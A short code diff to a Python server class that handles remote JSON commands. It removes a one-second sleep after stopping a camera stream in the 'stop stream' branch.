@@ -107,7 +107,6 @@ class Server (object) :
             elif JSON_READ_MSG["command"]== "stop stream":
                 if STATIC == True:
                     StopCameraStreaming()
-                    time.sleep(1)
                     #SERVER_TO_CONNECT.send(f"{Splus} {CR.green()}Done{CR.white()}".encode())
                 elif STATIC == False:
                     SERVER_TO_CONNECT.send(f"{Sminess} {CR.green()}no need to stop the {CR.blue()}Stream {CR.green()}it not running{CR.white()}".encode())
